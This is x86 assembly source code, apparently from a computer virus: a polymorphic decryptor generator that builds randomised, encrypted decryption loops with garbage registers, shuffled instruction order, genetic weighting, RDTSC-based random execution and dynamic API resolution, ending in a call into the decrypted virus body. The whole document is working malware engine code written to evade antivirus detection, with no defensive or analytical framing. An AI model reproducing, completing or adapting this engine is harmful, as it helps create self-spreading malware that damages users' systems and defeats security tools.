                mov     edx, [ebp+New_DISASM_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   ; Push the DISASM2_SECTION address

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_CODE_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   ; Push the CODE_SECTION address

                mov     edx, [ebp+GetProcAddressAddress]
                call    Poly_DoPUSHValue  ; Push the address of GetProcAddress

                mov     edx, [ebp+GetModuleHandleAddress]
                call    Poly_DoPUSHValue  ; Push the address of GetModuleHandle

                mov     edx, [ebp+TranslatedDeltaRegister]
                shl     edx, 1
                mov     eax, [ebp+GetModuleHandleMode]
                add     edx, eax
                call    Poly_DoPUSHValue  ; Push the delta register *2 and
                                          ; the A/W flag in the bit 0.


                call    Random            ; Get the first PRIDE value
                mov     ebx, [ebp+SizeOfNewCodeP2]
                sub     ebx, 4
                and     eax, ebx
                mov     [ebp+Poly_InitialValue], eax
                mov     [ebp+CounterValue], eax
                call    Random            ; Get the second PRIDE value
                sub     ebx, 4
                and     eax, ebx
                mov     [ebp+Poly_Addition], eax

                call    Random            ; Get the initial random index
                mov     ebx, [ebp+SizeOfNewCodeP2]
                sub     ebx, 4
                and     eax, ebx
                mov     [ebp+IndexValue], eax

                call    Random                 ; Set this register to a random
                mov     [ebp+BufferValue], eax ; value

                call    Poly_SelectThreeRegisters ; Select three registers to
                                           ; use as Index, Counter and Buffer
                call    Poly_SetValueToRegisters
                                           ; Set the values obtained before

                call    Poly_InsertLabel        ; Set the label for looping
                mov     [ebp+Poly_LoopLabel], eax


                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoPUSHReg          ; Save the register

                mov     ecx, [ebp+IndexRegister]
                mov     edx, [ebp+CounterRegister]
                call    Poly_DoXORRegReg        ; XOR Index with Counter (get
                                          ; a pseudo-random index for decrypt)

                mov     eax, 38h         ; Check if we overpass the data size
                mov     [edi], eax
                mov     eax, [ebp+IndexRegister]
                mov     [edi+1], eax
                mov     eax, [ebp+SizeOfNewCode]
                and     eax, 0FFFFFFFCh
                add     eax, 4
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 73h            ; If we overpass it, go to get the
                mov     [edi], eax          ; next pseudorandom index
                mov     [ebp+Poly_ExcessJumpInstruction], edi
                add     edi, 10h            ; Save this address for later

                mov     eax, 42h
                mov     [edi], eax          ; Get the DWORD at that index
                mov     eax, [ebp+IndexRegister]
                add     eax, 0800h
                mov     [edi+1], eax
                mov     eax, [ebp+StartOfEncryptedData]
                mov     [edi+3], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 3           ; WEIGHT_X007
                call    RandomBoolean_X004_7  ; Select if we encrypt or not
                                              ; genetically.
                                            ; If we don't encrypt, we only
                or      eax, eax            ; copy directly the DWORD to
                jz    @@NoEncryption        ; Memory
                call    Random              ; Get a random Key
    @@NoEncryption:
                mov     [ebp+EncryptionKey], eax

                mov     ecx, eax            ; Set the decryption key in ECX
                or      ecx, ecx            ; 0? (i.e. don't encrypt data)
                jz    @@DontMakeDecryption
     ;@@OtherMethod:
                ; WEIGHT_X008,WEIGHT_X009
                xor     eax, eax
                call    RandomBoolean_X008_11  ; Select an encryption method:
                or      eax, eax               ; ADD, XOR or SUB. We select
                jz    @@MethodXOR_prev         ; them with the genetic weights.
                mov     eax, 1
                call    RandomBoolean_X008_11
                jmp   @@SetMethod
        @@MethodXOR_prev:
                mov     eax, 2
        @@SetMethod:
                mov     [ebp+TypeOfEncryption], eax ; Set the type
                mov     ecx, [ebp+EncryptionKey]    ; Get the encryption key
                or      eax, eax
                jz    @@MethodADD            ; ADD?
                cmp     eax, 1
                jz    @@MethodSUB            ; SUB?
        @@MethodXOR:
                mov     eax, 30h             ; Construct XOR
                jmp   @@MakeDecryption
        @@MethodADD:
                neg     ecx                  ; Negate the key for ADD
        @@MethodSUB:
                xor     eax, eax             ; Construct ADD with the key
        @@MakeDecryption:                    ; negated if we make ADD or not
                                             ; if we make SUB
                mov     [edi], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+1], eax         ; Complete the decryption instrc.
                mov     [edi+7], ecx
                add     edi, 10h

        @@DontMakeDecryption:
                mov     eax, 02h            ; Add the address of the allocated
                mov     [edi], eax          ; memory (with CODE_SECTION added
                mov     eax, 0808h          ; too).
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                add     eax, 10h
                mov     [edi+3], eax
                mov     eax, [ebp+IndexRegister]  ; Complete the instruction
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 43h             ; Make a MOV of the value to the
                mov     [edi], eax           ; place on the allocated memory
                mov     eax, [ebp+IndexRegister] ; where it has to be
                add     eax, 0800h
                mov     [edi+1], eax
;                 mov     eax, [ebp+New_CODE_SECTION]
                xor     eax, eax
                mov     [edi+3], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+7], eax
                add     edi, 10h

                call    Poly_InsertLabel      ; Set the label where we jump
                mov     ebx, [ebp+Poly_ExcessJumpInstruction]  ; when the
                mov     [ebx+1], eax          ; index exceeds the data size
                                              ; and complete the JAE from
                                              ; before that must jump here.

                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoPOPReg         ; Make POP of the original index

                call    RandomBoolean    ; Let's make a random shuffle of the
                or      eax, eax         ; functions that modify the index,
                jz    @@AddIndexFirst    ; mask the index, increase the
    @@AddCounterFirst:                   ; counter and mask the counter. The
                call    Poly_ModifyCounter ; order for modify/mask must not
        @@C_SelectAnotherSequence:         ; vary, but we can interleave that
                call    Random             ; functions with the others, so
                and     eax, 3             ; that's what we do here.
                or      eax, eax           ; We first select to do IncCounter
                jz    @@C_SelectAnotherSequence ; or AddIndex, and then we
                                                ; select randomly the position
                push    eax                     ; of MaskCounter or MaskIndex
                cmp     eax, 1                  ; while we are coding the
                jnz   @@AddCounterFirst_Next00  ; other two functions.
                call    Poly_MaskCounter
        @@AddCounterFirst_Next00:
                call    Poly_ModifyIndex
                pop     eax

                push    eax
                cmp     eax, 2
                jnz   @@AddCounterFirst_Next01
                call    Poly_MaskCounter
        @@AddCounterFirst_Next01:
                call    Poly_MaskIndex
                pop     eax

                cmp     eax, 3
                jnz   @@AddCounterFirst_Next02
                call    Poly_MaskCounter
        @@AddCounterFirst_Next02:
                jmp   @@ModificationMade


    @@AddIndexFirst:                       ; This makes AddIndex first, and
                call    Poly_ModifyIndex   ; then inserts in a random position
       @@I_SelectAnotherSequence:          ; the MaskIndex function while
                call    Random             ; coding the ModifyCounter and the
                and     eax, 3             ; MaskCounter
                or      eax, eax
                jz    @@I_SelectAnotherSequence

                push    eax
                cmp     eax, 1
                jnz   @@AddIndexFirst_Next00
                call    Poly_MaskIndex
       @@AddIndexFirst_Next00:
                call    Poly_ModifyCounter
                pop     eax

                push    eax
                cmp     eax, 2
                jnz   @@AddIndexFirst_Next01
                call    Poly_MaskIndex
       @@AddIndexFirst_Next01:
                call    Poly_MaskCounter
                pop     eax

                cmp     eax, 3
                jnz   @@AddIndexFirst_Next02
                call    Poly_MaskIndex
       @@AddIndexFirst_Next02:

   ;; We arrive here with all modifications made and the current DWORD copied
   ;; and decrypted (or maybe not decrypted and left as is).

    @@ModificationMade:
                mov     eax, 38h          ; Make a comparision of the counter
                mov     [edi], eax        ; with the first value that it had.
                mov     eax, [ebp+CounterRegister]    ; If it's the same, we
                mov     [edi+1], eax                  ; have finished the 
                mov     eax, [ebp+Poly_InitialValue]  ; decryption.
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 75h          ; Make the JNZ to the loop label
                mov     [edi], eax
                mov     eax, [ebp+Poly_LoopLabel]
                mov     [edi+1], eax
                add     edi, 10h

;;;;;;;                               ; Now get the address where the virus
                mov     eax, 8        ; is copied/decrypted and CALL there
                mov     [ebp+CounterRegister], eax
                mov     [ebp+BufferRegister], eax

                mov     ecx, [ebp+DeltaRegister]
                mov     [ebp+IndexRegister], ecx
                xor     ebx, ebx
                call    Poly_DoMOVRegMem   ; Get the DeltaRegister value

                mov     ecx, [ebp+Decryptor_DATA_SECTION]
                add     ecx, 10h
                call    Poly_DoCALLMem     ; Call the virus

                call    Poly_InsertLabel   ; Insert this label and complete
                                           ; the jump here (when there was an
                                           ; error allocating virtual memory)
                mov     edx, [ebp+Poly_Jump_ErrorInVirtualAlloc]
                mov     [edx+1], eax
                mov     edx, [ebp+Poly_JumpRandomExecution] ; If there is a
                or      edx, edx            ; random-execution routine, fix
                jz    @@DontSetJump         ; that jump also.
                mov     [edx+1], eax

      @@DontSetJump:
                call    Poly_SelectThreeRegisters
                xor     edx, edx
                call    Poly_DoPUSHValue    ; Push a value of 0 (no error :)

                mov     ecx, [ebp+ExitProcessAddress]
                call    Poly_DoCALLMem      ; Call to ExitProcess

                mov     ebx, [ebp+VarMarksTable]  ; Clear the marks of the
                mov     ecx, 1000h       ; variables used in this decryptor
                xor     eax, eax         ; for the next decryptors that could
     @@LoopClearMarks:                   ; be made after this one.
                mov     [ebx], eax
                add     ebx, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@LoopClearMarks

                mov     [ebp+AddressOfLastInstruction], edi ; Set the address
                mov     eax, [ebp+OtherBuffers]     ; of the last instruction
                mov     [ebp+JumpsTable], eax       ; and some buffers that
                add     eax, 8000h                  ; we need for the engine
                mov     [ebp+FramesTable], eax      ; functions.

                mov     eax, [ebp+NewAssembledCode]
                push    eax
                mov     eax, [ebp+TranslatedDeltaRegister]
                push    eax

                call    XpandCode          ; Expand the code of the decryptor

                mov     eax, [ebp+InstructionTable] ; Now arrange the addresses
                mov     [ebp+NewAssembledCode], eax ; and values needed for
                mov     eax, [ebp+ExpansionResult]  ; the Assembler
                mov     [ebp+InstructionTable], eax

                mov     eax, [ebp+SizeOfNewCode]    ; Save these values that
                push    eax                         ; we must keep
                mov     eax, [ebp+RoundedSizeOfNewCode]
                push    eax
                mov     eax, [ebp+SizeOfNewCodeP2]
                push    eax

                call    AssembleCode        ; Assemble the decryptor

                mov     eax, [ebp+SizeOfNewCode]     ; Set the new addresses
                mov     [ebp+SizeOfDecryptor], eax   ; and sizes
                mov     eax, [ebp+NewAssembledCode]
                mov     [ebp+AssembledDecryptor], eax

                pop     eax                          ; Restore some values
                mov     [ebp+SizeOfNewCodeP2], eax
                pop     eax
                mov     [ebp+RoundedSizeOfNewCode], eax
                pop     eax
                mov     [ebp+SizeOfNewCode], eax

                pop     eax
                mov     [ebp+TranslatedDeltaRegister], eax
                pop     eax
                mov     [ebp+NewAssembledCode], eax

                ret                       ; Return with a new brand decryptor.
MakeDecryptor   endp

;; Function to insert a label in the label table.
Poly_InsertLabel proc
                mov     eax, [ebp+LabelTable]     ; Get the label table
                mov     ecx, [ebp+NumberOfLabels] ; Get the number of labels
                or      ecx, ecx
                jz    @@InsertLabel        ; If 0, insert at the beginning
       @@LoopFindLabel:
                cmp     [eax], edi         ; If not, check if that label is
                jz    @@LabelInserted      ; already inserted
                add     eax, 8
                sub     ecx, 1             ; If it is, return the label addr.
                or      ecx, ecx           ; If not, we insert the new label
                jnz   @@LoopFindLabel      ; at the end of the table
       @@InsertLabel:
                mov     [eax], edi         ; Set the new label
                mov     [eax+4], edi
                mov     ecx, [ebp+NumberOfLabels]  ; Increase the number of
                add     ecx, 1                     ; labels.
                mov     [ebp+NumberOfLabels], ecx
 @@LabelInserted:
                ret             ; Return.
Poly_InsertLabel endp

;; Function to set the function name passed in the values of Index, Counter
;; and Buffer. An instruction will be created for each one (in a random order)
;; and after that another three instructions will be created for putting the
;; values of the registers into the buffer that GetModuleHandle or
;; GetProcAddres will use to get the data needed.
Poly_SetFunctionName proc
                call    Poly_SelectThreeRegisters ; Select new registers

                mov     edx, [ebp+Poly_FirstPartOfFunction]
                mov     [ebp+IndexValue], edx       ; Set the values
                mov     edx, [ebp+Poly_SecondPartOfFunction]
                mov     [ebp+BufferValue], edx
                mov     edx, [ebp+Poly_ThirdPartOfFunction]
                mov     [ebp+CounterValue], edx

                call    Poly_SetValueToRegisters    ; Make MOV instructions

                call    Poly_SetPART_ONEtoMemory_GetStartAddress
                mov     ebx, eax
                call    Poly_SetPART_TWOtoMemory_GetStartAddress
                mov     ecx, eax
                call    Poly_SetPART_THREEtoMemory_GetStartAddress
                mov     edx, eax
                call    Poly_RandomCall       ; Make instructions to set the
                                              ; current value of the registers
                                              ; to the specified buffer.

                call    Poly_SelectThreeRegisters  ; Get three new registers
                mov     ecx, [ebp+IndexRegister]
                xor     edx, edx
                call    Poly_DoMOVRegValue         ; Set a 0 at the end of
                                                   ; the data set before (with
                                                   ; the new created MOVs)

                mov     ebx, [ebp+AdditionToBuffer]
                add     ebx, 0Ch
                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoMOVMemReg           ; ASCIIZ (or UNICODEZ :)
                ret
Poly_SetFunctionName endp


;; This function selects three new registers for Index, Counter and Buffer.
Poly_SelectThreeRegisters proc
                mov     eax, 8
                mov     [ebp+IndexRegister], eax   ; Initialize them to no_reg
                mov     [ebp+BufferRegister], eax
                mov     [ebp+CounterRegister], eax

                call    Poly_GetAGarbageRegister    ; Get a register
                mov     [ebp+IndexRegister], eax    ; Set it
                call    Poly_GetAGarbageRegister    ; Get a register
                mov     [ebp+BufferRegister], eax   ; Set it
                call    Poly_GetAGarbageRegister    ; Get a register
                mov     [ebp+CounterRegister], eax  ; Set it
                ret
Poly_SelectThreeRegisters endp

;; Function to construct MOVs to set the values specified in every register
;; field to the corresponding Buffer, Counter and/or Index register.
Poly_SetValueToRegisters proc
                call    Poly_SetIndexValue_GetStartAddress ; Get the addresses
                mov     ebx, eax                           ; of the functions
                call    Poly_SetBufferValue_GetStartAddress ; to make a
                mov     ecx, eax                            ; random-ordered
                call    Poly_SetCounterValue_GetStartAddress ; call.
                mov     edx, eax
                call    Poly_RandomCall   ; Make random-ordered call of
                ret                       ; the functions at EBX,ECX and EDX
Poly_SetValueToRegisters endp

;; Function to modify the counter in the decryption loop using PRIDE)
Poly_ModifyCounter proc
                call    Random
                and     eax, 3    ; Add 4 plus a random 0-3. This will be
                add     eax, 4    ; eliminated by the mask.
                mov     edx, eax
                mov     ecx, [ebp+CounterRegister]
                call    Poly_DoADDRegValue
                ret
Poly_ModifyCounter endp

;; Mask the register passed at ECX with the value in SizeOfNewCodeP2 (MOD of
;; that value)
Poly_MaskRegister proc
                mov     eax, 20h     ; Make AND
                mov     [edi], eax
                mov     [edi+1], ecx
                call    Random       ; Get a random upper bits until the one
                mov     ebx, [ebp+SizeOfNewCodeP2]  ; that we must anulate
                mov     ecx, ebx                    ; (i.e. set to 0) to make
                not     ebx                         ; an effective MOD of the
                and     eax, ebx                    ; value. All these bits
                sub     ecx, esi                    ; set to random values are
                or      eax, ecx                    ; always 0 in the register
                neg     esi                         ; we are masking, so there
                and     eax, esi                    ; is no problem.
                mov     [edi+7], eax
                add     edi, 10h
                ret
Poly_MaskRegister endp

;; Mask the counter. Get the register in ECX and call the MaskRegister
Poly_MaskCounter proc
                mov     ecx, [ebp+CounterRegister]
                mov     esi, 4
                jmp     Poly_MaskRegister
Poly_MaskCounter endp

;; Mask the index.
Poly_MaskIndex proc
                mov     ecx, [ebp+IndexRegister]
                mov     esi, 1
                jmp     Poly_MaskRegister
Poly_MaskIndex endp

;; To modify the index, we add the addition we calculated at the beginning
;; of the polymorphism function
Poly_ModifyIndex proc
                mov     edx, [ebp+Poly_Addition]
                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoADDRegValue
                ret
Poly_ModifyIndex endp


Poly_RandomCall proc
                mov     esi, 5        ; Garble the values at EBX, ECX and EDX
     @@Again:   call    Xp_GarbleRegisters
                sub     esi, 1
                or      esi, esi
                jnz   @@Again
                or      ebx, ebx      ; If 0 in any one, don't push it
                jz    @@DontPush1st
                push    ebx
     @@DontPush1st:
                or      ecx, ecx
                jz    @@DontPush2nd
                push    ecx
     @@DontPush2nd:
                or      edx, edx
                jz    @@DontPush3rd
                push    edx
     @@DontPush3rd:                   ; Ret and execute the functions in that
                ret                   ; registers one after another
Poly_RandomCall endp

; To do a random-ordered calling of several functions we must know the address
; of this functions, but if we have a metamorphic code we can't do it because
; we can't make a difference between a normal value and an offset value (while
; doing LEA, or other), so we can't rely on hard-coded offsets to get function
; addresses. For this case, the idea is to put a call pointing to a POP & RET
; just before the start address of the function, so the CALL automatically
; will return into the stack the starting address of the function, so calling
; to Poly_SetIndexValue_GetStartAddress() (for example) will call to the func
; Poly_RandomCall_GetAddress(), which makes a POP EAX (putting there the
; starting address of the function) and then returning to where we called
; to xxxGetStartAddress(). Easy, isn't it? No! It is easy once you know it,
; but it wasn't easy to get the idea (believe me :).

Poly_SetIndexValue_GetStartAddress:
                call    Poly_RandomCall_GetAddress ; Get the start address
Poly_SetIndexValue proc
                mov     ecx, [ebp+IndexRegister]
                mov     edx, [ebp+IndexValue]
                call    Poly_DoMOVRegValue
                ret
Poly_SetIndexValue endp


Poly_SetBufferValue_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetBufferValue proc
                mov     ecx, [ebp+BufferRegister]
                mov     edx, [ebp+BufferValue]
                call    Poly_DoMOVRegValue
                ret
Poly_SetBufferValue endp


Poly_SetCounterValue_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetCounterValue proc
                mov     ecx, [ebp+CounterRegister]
                mov     edx, [ebp+CounterValue]
                call    Poly_DoMOVRegValue
                ret
Poly_SetCounterValue endp


Poly_RandomCall_GetAddress proc  ; Function where we return, POPing the
                pop     eax      ; return address and getting the function
                ret              ; start.
Poly_RandomCall_GetAddress endp


Poly_SetPART_ONEtoMemory_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetPART_ONEtoMemory proc
                mov     ecx, [ebp+IndexRegister]
                mov     ebx, [ebp+AdditionToBuffer]
                call    Poly_DoMOVMemReg
                ret
Poly_SetPART_ONEtoMemory endp

Poly_SetPART_TWOtoMemory_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetPART_TWOtoMemory proc
                mov     ecx, [ebp+BufferRegister]
                mov     ebx, [ebp+AdditionToBuffer]
                add     ebx, 4
                call    Poly_DoMOVMemReg
                ret
Poly_SetPART_TWOtoMemory endp

Poly_SetPART_THREEtoMemory_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetPART_THREEtoMemory proc
                mov     ecx, [ebp+CounterRegister]
                mov     ebx, [ebp+AdditionToBuffer]
                add     ebx, 8
                call    Poly_DoMOVMemReg
                ret
Poly_SetPART_THREEtoMemory endp


;; Function to generate a MOV Reg,Value (with our pseudoassembler).
Poly_DoMOVRegValue proc
                mov     eax, 2
                call    RandomBoolean_X008_11 ; Get direct or indirect method
                or      eax, eax              ; WEIGHT_X010
                jz    @@Direct
                call    Poly_GetAGarbageRegister ; If indirect, we get a
                push    ecx                      ; garbage register, move the
                mov     ecx, eax                 ; value to it and after that
                call  @@Direct                   ; we move the register to
                mov     eax, 41h                 ; the one that we want.
                mov     [edi], eax
                mov     [edi+1], ecx
                pop     ecx
                mov     [edi+7], ecx
                add     edi, 10h
                ret
    @@Direct:   mov     eax, 40h         ; If direct, then that: direct :)
                mov     [edi], eax
                mov     [edi+1], ecx
                mov     [edi+7], edx
                add     edi, 10h
                ret
Poly_DoMOVRegValue endp

;; This function makes an ADD Reg,Value in the same way that in the function
;; above: direct will add the value to the register, while indirect will
;; move the value to a garbage register and after that will add that register
;; to the one that we want to modify.
Poly_DoADDRegValue proc
                mov     eax, 3
                call    RandomBoolean_X008_11  ; Select direct or indirect
                or      eax, eax
                jz    @@Direct
                mov     eax, 40h       ; Move the value to add to a garbage
                mov     [edi], eax     ; register
                call    Poly_GetAGarbageRegister
                mov     [edi+1], eax
                mov     ebx, eax
                mov     [edi+7], edx
                add     edi, 10h
                mov     eax, 01h       ; ADD Reg,Reg
                mov     [edi], eax
                mov     [edi+1], ebx
                mov     [edi+7], ecx
                add     edi, 10h
                ret
         @@Direct:
                xor     eax, eax       ; ADD Reg,Value
                mov     [edi], eax
                mov     [edi+1], ecx
                mov     [edi+7], edx
                add     edi, 10h
                ret
Poly_DoADDRegValue endp

;; Just that: MOV Mem,Reg. The memory is the DATA section of the decryptor,
;; and the offset within is in EBX.
Poly_DoMOVMemReg proc
                xor     eax, eax
                call    RandomBoolean_X012_15
                or      eax, eax
                jz    @@Direct        ; Select direct or indirect
                mov     eax, 41h
                mov     [edi], eax
                mov     [edi+1], ecx  ; Make MOV GarbageReg,Reg and substitute
                call    Poly_GetAGarbageRegister  ; the original register by
                mov     ecx, eax                  ; the garbage one.
                mov     [edi+7], eax
                add     edi, 10h

    @@Direct:   mov     eax, 43h      ; MOV Mem,Reg pseudoopcode
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, ebx      ; Get the offset and add the DATA sect.
                add     eax, [ebp+Decryptor_DATA_SECTION]  ; of the virus.
                mov     [edi+3], eax
                mov     [edi+7], ecx
                add     edi, 10h
                ret
Poly_DoMOVMemReg endp

;; Just like above, but inversed.
Poly_DoMOVRegMem proc
                mov     eax, 1
                call    RandomBoolean_X012_15   ; Direct or indirect
                or      eax, eax
                jz    @@Direct
                push    ecx
                call    Poly_GetAGarbageRegister ; Use this garbage register.
                mov     ecx, eax
                call  @@Direct         ; Make the MOV GarbageReg,Mem
                mov     eax, 41h       ; MOV Reg,GarbageReg
                mov     [edi], eax
                mov     [edi+1], ecx
                pop     ecx
                mov     [edi+7], ecx
                add     edi, 10h
                ret

    @@Direct:   mov     eax, 42h       ; Make the instruction directly
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, ebx       ; EBX is an offset within DATA sect. of
                add     eax, [ebp+Decryptor_DATA_SECTION]  ; the decryptor.
                mov     [edi+3], eax
                mov     [edi+7], ecx
                add     edi, 10h
                ret
Poly_DoMOVRegMem endp

;; Make a PUSH Reg
Poly_DoPUSHReg  proc
                mov     eax, 50h
                mov     [edi], eax
                mov     [edi+1], ecx
                add     edi, 10h
                ret
Poly_DoPUSHReg  endp

;; Make a POP Reg
Poly_DoPOPReg   proc
                mov     eax, 58h
                mov     [edi], eax
                mov     [edi+1], ecx
                add     edi, 10h
                ret
Poly_DoPOPReg   endp

;; Make a PUSH Value
Poly_DoPUSHValue proc
                mov     eax, 2     ; WEIGHT_X014
                call    RandomBoolean_X012_15 ; Make it directly or indirectly.
                and     eax, 3      ; directly just pushes the value, and
                or      eax, eax    ; indirectly first moves the value to a
                jz    @@Direct      ; garbage register and then pushes that
                mov     eax, 40h    ; register.
                mov     [edi], eax
                call    Poly_GetAGarbageRegister
                mov     [edi+1], eax
                mov     [edi+7], edx
                add     edi, 10h
                mov     ecx, eax
                call    Poly_DoPUSHReg
                ret

     @@Direct:  mov     eax, 68h
                mov     [edi], eax
                mov     [edi+7], edx
                add     edi, 10h
                ret
Poly_DoPUSHValue endp

;; This function will perform a XOR Reg,Reg, both directly and indirectly
;; (with a garbage register), like the functions above.
Poly_DoXORRegReg proc
                mov     eax, 3
                call    RandomBoolean_X012_15 ; WEIGHT_X015
                or      eax, eax
                jz    @@Single
                call    Poly_GetAGarbageRegister
                mov     esi, eax
                mov     eax, 41h      ; Make MOV GarbageReg,SourceReg
                mov     [edi], eax
                mov     [edi+1], edx  
                mov     [edi+7], esi
                add     edi, 10h      
                mov     edx, esi      ; Subsitute the SourceReg by the garbage
                                      ; register.
    @@Single:   mov     eax, 31h      ; Make XOR DestinyReg,GarbageReg
                mov     [edi], eax
                mov     [edi+1], edx
                mov     [edi+7], ecx
                add     edi, 10h
                ret
Poly_DoXORRegReg endp

;; This function gets a register that is not used by the decryptor (or
;; whatever the code we are doing). Concretely, it gets a random register from
;; 0 to 7, and if it's not ESP, IndexReg, CounterReg or BufferReg, then it
;; returns it (it's not used/reserved).
Poly_GetAGarbageRegister proc
    @@Again:    call    Random
                and     eax, 7
                cmp     eax, [ebp+IndexRegister]
                jz    @@Again
                cmp     eax, [ebp+CounterRegister]
                jz    @@Again
                cmp     eax, [ebp+BufferRegister]
                jz    @@Again
                cmp     eax, 4
                jz    @@Again
                ret
Poly_GetAGarbageRegister endp

;; This function creates a check with 0
Poly_MakeCheckWith0 proc
                xor     eax, eax
                call    RandomBoolean_X016_19  ; WEIGHT_X016
                or      eax, eax
                jnz   @@Single
                mov     eax, 40h            ; Composed option: MOV Reg2,0 /
                mov     [edi], eax          ;                  CMP Reg,Reg2
                call    Poly_GetAGarbageRegister
                mov     [edi+1], eax
                xor     ebx, ebx
                mov     [edi+7], ebx
                add     edi, 10h
                mov     ebx, 39h
                mov     [edi], ebx
                mov     [edi+1], eax
                mov     [edi+7], ecx
                add     edi, 10h
                ret

    @@Single:   mov     eax, 38h      ; This one is direct
                mov     [edi], eax
                mov     [edi+1], ecx
                xor     eax, eax
                mov     [edi+7], eax
                add     edi, 10h
                ret
Poly_MakeCheckWith0 endp

;; This function makes a CALL to a memory address. It's used mainly for API
;; calls. We can do both simple and composed CALLs.
Poly_DoCALLMem  proc
                mov     eax, 1
                call    RandomBoolean_X016_19 ; WEIGHT_X017
                or      eax, eax
                jz    @@Single
                mov     eax, 40h     ; Move the address to a garbage register
                mov     [edi], eax
                call    Poly_GetAGarbageRegister
                mov     ebx, eax
                mov     [edi+1], eax
                mov     [edi+7], ecx
                add     edi, 10h
                mov     eax, 0EAh    ; Call to [Register]
                mov     [edi], eax
                mov     eax, 0800h
                add     eax, ebx
                mov     [edi+1], eax
                xor     eax, eax
                mov     [edi+3], eax
                add     edi, 10h
                ret
    @@Single:   mov     eax, 0EAh   ; Call the address directly
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     [edi+3], ecx
                add     edi, 10h
                ret
Poly_DoCALLMem  endp

;; This piece of code generates a RDTSC/RET function in runtime once in
;; every 4 created decryptors. The mini-routine has some variants, to make
;; it a little "polymorphic" :).
;; There isn't a standard way of getting a random number in runtime without
;; using APIs (to my knowledge), since FS:[xxx] addresses depend on the
;; win32 system we use (Win9x or WinNT).
Poly_MakeRandomExecution proc
                mov     eax, 2
                call    RandomBoolean_X016_19  ; WEIGHT_X018
                                    ; Only a prob. of making this of 1/4!
                or      eax, eax    ; (at first generation, after that it
                jnz   @@Normal      ; evolves)
                call    Poly_SelectThreeRegisters   ; Select new registers
                mov     ecx, [ebp+IndexRegister]    ; Construct the mini-
                mov     edx, [ebp+Decryptor_DATA_SECTION] ; function here.
                call    Random         ; Get a random offset inside the
                and     eax, 1Ch       ; first 20h bytes of the decryptor
                add     edx, eax       ; data section, and construct the
                cmp     eax, 1Ch       ; 4-byte function there.
                jz    @@DontAddMore
                call    Random
                and     eax, 3
                add     edx, eax
       @@DontAddMore:                      ; Set the IndexRegister with this
                call    Poly_DoMOVRegValue ; value.

                call    Random                     ; Get a random number
                push    eax                        ; Save it
                mov     edx, eax                   ; Move it to BufferReg
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoMOVRegValue
        @@RDTSC_Option0:
                mov     eax, 3
                call    RandomBoolean_X016_19 ; Get one of the three possible
                ; WEIGHT_X019                 ; variants.
                or      eax, eax
                jz    @@RDTSC_Option2    ; Garbage at the beginning
                xor     eax, eax
                call    RandomBoolean_X020_23 ; WEIGHT_X020
                or      eax, eax
                jz    @@RDTSC_Option3    ; Garbage in the middle
        @@RDTSC_Option1:
                call    Random
                and     eax, 0FF000000h  ; Garbage at the end (a random byte :)
                add     eax, 000C3310Fh
                jmp   @@RDTSC_SetInstruction
        @@RDTSC_Option2:
                call    Poly_GetGarbageOneByter
                ;and     eax, 0000000FFh ; Set a one-byte do-nothing instrc.
                add     eax, 0C3310F00h  ; at the beginning
                jmp   @@RDTSC_SetInstruction
        @@RDTSC_Option3:
                call    Poly_GetGarbageOneByter
                shl     eax, 10h         ; Set a one-byter in the middle
                add     eax, 0C300310Fh
        @@RDTSC_SetInstruction:
                mov     edx, eax         ; Now make the value in EAX from the
                pop     eax              ; random value we made before.
                sub     edx, eax
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoADDRegValue ; Make it by ADD (or SUB). It's
                                           ; a way of encrypting it.

                mov     eax, 43h         ; Make a MOV [IndexReg],BufferReg
                mov     [edi], eax
                mov     eax, 0800h
                add     eax, [ebp+IndexRegister]
                mov     [edi+1], eax
                xor     eax, eax
                mov     [edi+3], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 0ECh        ; Now make CALL IndexReg.
                mov     [edi], eax
                mov     eax, [ebp+IndexRegister]
                mov     [edi+1], eax     ; It will return a random value in
                add     edi, 10h         ; EAX

                xor     eax, eax         ; Set IndexReg as EAX
                mov     [ebp+IndexRegister], eax
                mov     eax, 8           ; Destroy the other registers
                mov     [ebp+BufferRegister], eax
                mov     [ebp+CounterRegister], eax

                mov     eax, 1
                call    RandomBoolean_X020_23    ; TEST or AND/CMP?
                                               ; WEIGHT_X021
                or      eax, eax
                jz    @@DirectTEST
      @@ANDandCheck:
                mov     eax, 20h        ; Make AND EAX,2^rnd
                mov     [edi], eax
                xor     eax, eax
                call    Xpand_ReverseTranslation ; Set the register that will
                mov     [edi+1], eax             ; be translated to EAX with
                call  @@GetARandomPowerOf2       ; the expander
                mov     [edi+7], edx
                add     edi, 10h

                xor     eax, eax
                call    Xpand_ReverseTranslation
                mov     ecx, eax
                call    Poly_MakeCheckWith0   ; Make a check with 0
      @@SetTheJump:
                mov     eax, 2
                call    RandomBoolean_X020_23  ; WEIGHT_X022
                add     eax, 74h              ; Set a random JZ/JNZ to
                mov     [edi], eax            ; ExitProcess.
                mov     [ebp+Poly_JumpRandomExecution], edi ; Set the address
                add     edi, 10h             ; of the jump to complete and
                ret                          ; return.
